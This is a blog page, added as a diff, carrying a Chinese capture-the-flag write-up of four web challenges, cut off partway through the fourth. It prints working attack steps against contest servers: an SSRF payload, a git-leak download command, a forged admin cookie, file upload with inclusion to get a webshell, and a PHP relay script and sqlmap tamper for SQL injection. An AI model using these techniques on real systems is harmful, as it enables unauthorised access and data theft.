@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Write_Up," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="太菜了，只做出两道web，后面的两道是参考的史努比小哥哥的 web1进入题目要求登录一下  去注册一个账号，发现了可以修改密码，并且提示flag在flag.php  此时想到能不能重置管理员密码，尝试修改密码然后抓包将用户名改为admin的base64加密，成功重置管理员密码 登录管理员账号  发现可以发布信息，而且那个远程图片地址很扎眼，猜测是ssrf，但是尝试了很久都不对。 又尝试了文件上传，">
+<meta name="keywords" content="Write_Up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网安技术大赛部分WP">
+<meta property="og:url" content="http://eagerseven.cn/2018/05/15/网安技术大赛WP/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="太菜了，只做出两道web，后面的两道是参考的史努比小哥哥的 web1进入题目要求登录一下  去注册一个账号，发现了可以修改密码，并且提示flag在flag.php  此时想到能不能重置管理员密码，尝试修改密码然后抓包将用户名改为admin的base64加密，成功重置管理员密码 登录管理员账号  发现可以发布信息，而且那个远程图片地址很扎眼，猜测是ssrf，但是尝试了很久都不对。 又尝试了文件上传，">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7e989db503.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7eb5b9ca3e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7ec1a4da64.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7ecf0c50f7.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7ed46136aa.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7ed86e02e5.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7edad4a58b.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7ee5df178d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af7f00255ccd.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/05/13/5af80f3556c42.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fr9voc7xorj318c0t0wjm.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fr9vryieqrj30py076q3k.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/2.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/3.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/4.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/5.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/6.jpg">
+<meta property="og:image" content="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/1.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.560Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网安技术大赛部分WP">
+<meta name="twitter:description" content="太菜了，只做出两道web，后面的两道是参考的史努比小哥哥的 web1进入题目要求登录一下  去注册一个账号，发现了可以修改密码，并且提示flag在flag.php  此时想到能不能重置管理员密码，尝试修改密码然后抓包将用户名改为admin的base64加密，成功重置管理员密码 登录管理员账号  发现可以发布信息，而且那个远程图片地址很扎眼，猜测是ssrf，但是尝试了很久都不对。 又尝试了文件上传，">
+<meta name="twitter:image" content="https://i.loli.net/2018/05/13/5af7e989db503.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/05/15/网安技术大赛WP/"/>
+
+
+
+
+
+  <title>网安技术大赛部分WP | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/05/15/网安技术大赛WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网安技术大赛部分WP</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-15T18:54:00+08:00">
+                2018-05-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,339
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>太菜了，只做出两道web，后面的两道是参考的史努比小哥哥的</p>
+<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>进入题目要求登录一下</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7e989db503.jpg" alt=""></p>
+<p>去注册一个账号，发现了可以修改密码，并且提示flag在flag.php</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7eb5b9ca3e.jpg" alt=""></p>
+<p>此时想到能不能重置管理员密码，尝试修改密码然后抓包将用户名改为admin的base64加密，成功重置管理员密码</p>
+<p>登录管理员账号</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7ec1a4da64.jpg" alt=""></p>
+<p>发现可以发布信息，而且那个远程图片地址很扎眼，猜测是ssrf，但是尝试了很久都不对。</p>
+<p>又尝试了文件上传，但是上传的文件会被转为jpg，没法解析</p>
+<p>后来py了下史努比小哥哥，发现这里有一个坑，确实是ssrf，利用点也在远程图片链接那里。填入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+<p>前缀必须是<code>http://</code>，否则会报错。</p>
+<p>发布成功：</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7ecf0c50f7.jpg" alt=""></p>
+<p>将这个图片下载下来，改后缀打开就能拿到flag</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>进入题目也是登录页面</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7ed46136aa.jpg" alt=""></p>
+<p>但是没找到注册点，弱口令也不行</p>
+<p>扫描到了git，看来是git源码泄漏</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7ed86e02e5.jpg" alt=""></p>
+<p>能看到目录结构</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7edad4a58b.jpg" alt=""></p>
+<p>看到了upload.php，看来有文件上传，直接访问是不行的</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7ee5df178d.jpg" alt=""></p>
+<p>利用githack工具下载源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python githack.py http://117.34.116.192/.git/</span><br></pre></td></tr></table></figure>
+<p>拿到源码分析下upload.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function Administrator($value)&#123;</span><br><span class="line">        if(empty($_COOKIE[&apos;in_adminid&apos;]) || empty($_COOKIE[&apos;in_adminexpire&apos;]) || $_COOKIE[&apos;in_adminexpire&apos;]!==md5($_COOKIE[&apos;in_adminid&apos;].$_COOKIE[&apos;in_adminname&apos;].$_COOKIE[&apos;in_adminpassword&apos;].$_COOKIE[&apos;in_permission&apos;]))&#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">        setcookie(&quot;in_adminexpire&quot;,$_COOKIE[&apos;in_adminexpire&apos;],time()+1800);</span><br><span class="line">        if(!empty($_COOKIE[&apos;in_permission&apos;]))&#123;</span><br><span class="line">            $array=explode(&quot;,&quot;,$_COOKIE[&apos;in_permission&apos;]);</span><br><span class="line">            $adminlogined=false;</span><br><span class="line">            for($i=0;$i&lt;count($array);$i++)&#123;</span><br><span class="line">                if($array[$i]==$value)&#123;$adminlogined=true;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if(!$adminlogined)&#123;</span><br><span class="line">                return False;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (Administrator(2))&#123;</span><br><span class="line">        if(isset($_FILES[&apos;file&apos;]))&#123;</span><br><span class="line">            $filename = &apos;./img/img&apos;.rand().&apos;.jpg&apos;;</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$filename);</span><br><span class="line">            header(&apos;Refresh:3,url=index.php?file=upload.php&apos;);</span><br><span class="line">            echo &quot;Upload $filename Success!&quot;;</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&apos;Refresh:3,url=index.php?file=login.html&apos;);</span><br><span class="line">        echo &quot;Who are you!&quot;;</span><br><span class="line">        die;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_adminid=2;in_adminname=test;in_adminpassword=test;in_permission=1,2,3,4,5,6,7,8,9;in_adminexpire=b2e9b95b82be9264c3368b3f0de34f08</span><br></pre></td></tr></table></figure>
+<p>利用火狐的<code>modify header value</code>插件成功访问upload.php</p>
+<p><img src="https://i.loli.net/2018/05/13/5af7f00255ccd.jpg" alt=""></p>
+<p>上传图片后会给出存储地址</p>
+<p><img src="https://i.loli.net/2018/05/13/5af80f3556c42.jpg" alt=""></p>
+<p>然后在file参数那里包含这个图片，再连接Altman即可</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fr9voc7xorj318c0t0wjm.jpg" alt=""></p>
+<p>里面有一个f14g.php，一开始以为就是flag，可是打开后乱码，改变了很多了编码格式还是乱码，后来搜了下才知道是PM9SCREW加密，利用<code>php_screw</code>解密得到flag</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fr9vryieqrj30py076q3k.jpg" alt=""></p>
+<h3 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h3><p>直接用pc端的浏览器会跳转到QQ空间,想到不久前先知的一篇文章:</p>
+<p><a href="https://xz.aliyun.com/t/2322" target="_blank" rel="noopener">https://xz.aliyun.com/t/2322</a></p>
+<p>抓包发现了2个请求,首先加载一个JS.</p>
+<p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/2.jpg" alt="img"></p>
+<p>获取到的JS加密了.</p>
+<p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/3.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(decodeURIComponent(arcfour(&quot;36a9dc5d29d54b46793d0c682298dbab&quot;,base64_decode(&quot;...&quot;))))</span><br></pre></td></tr></table></figure>
+<p>这里先对密文进行base64解码=&gt;RC4解密=&gt;URL解码,然写入当前页面.只需要简单做下修改就能拿到明文了.</p>
+<p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/4.jpg" alt="img"></p>
+<p>找到其中发送账号密码的请求,</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!err)&#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:<span class="string">'/f701fee85540b78d08cb276d14953d58'</span>,</span><br><span class="line">		type:<span class="string">'POST'</span>,</span><br><span class="line">		dataType:<span class="string">'json'</span>,</span><br><span class="line">		data: <span class="string">"data="</span>+<span class="built_in">encodeURIComponent</span>(encryptByDES($(<span class="string">'#loginform'</span>).serialize(),key)),</span><br><span class="line">		error:<span class="function"><span class="keyword">function</span>(<span class="params">er</span>)</span>&#123;</span><br><span class="line">		    <span class="built_in">window</span>.location.href=<span class="string">'https://qzone.qq.com'</span>;</span><br><span class="line">              &#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发送的数据会先DES加密,输出明文和密钥看下.</p>
+<p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/5.jpg" alt="img"></p>
+<p>测试后发现密码字段存在注入,用PHP写个中转脚本.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">'pwd'</span>];</span><br><span class="line">$p = <span class="string">"ip=&#123;$ip&#125;&amp;hrUW3PG7mp3RLd3dJu=&#123;$name&#125;&amp;LxMzAX2jog9Bpjs07jP=&#123;$pwd&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">des_encrypt</span><span class="params">($str, $key)</span> </span>&#123;</span><br><span class="line">  $block = mcrypt_get_block_size(<span class="string">'des'</span>, <span class="string">'ecb'</span>);</span><br><span class="line">  $pad = $block - (strlen($str) % $block);</span><br><span class="line">  $str .= str_repeat(chr($pad), $pad);</span><br><span class="line">  <span class="keyword">return</span> mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);</span><br><span class="line">&#125;</span><br><span class="line">$c = urlencode(base64_encode(des_encrypt($p,<span class="string">"MiaoMiao"</span>)));</span><br><span class="line">$post = <span class="string">"data="</span>.$c;</span><br><span class="line"><span class="comment">//$post = ['data' =&gt; $c,];   这样写是content-type是上传文件的!!被坑了好久</span></span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">'X-Requested-With: XMLHttpRequest'</span>,));</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$ch_out = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+<p>或者写个sqlmap的tamper,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_enc</span><span class="params">(key, str)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> str</span><br><span class="line">    k = des(key, ECB, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">    encrypt_str = k.encrypt(str)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypt_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    p = <span class="string">"ip=1&amp;hrUW3PG7mp3RLd3dJu=1&amp;LxMzAX2jog9Bpjs07jP=%s"</span> % payload</span><br><span class="line">    enc_data = des_enc(bytes(<span class="string">"MiaoMiao"</span>), bytes(p))</span><br><span class="line">    <span class="keyword">return</span> enc_data</span><br></pre></td></tr></table></figure>
+<p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/6.jpg" alt="img"></p>
+<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p><img src="https://03i0.com/2018/05/13/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BWEB-writeup/1.jpg" alt="img"></p>
+<p>一个没过滤的XSS盲打,并且给了一段代码提示.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">type msg struct &#123;</span><br><span class="line">	Cmd string <span class="string">`json:"cmd"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span 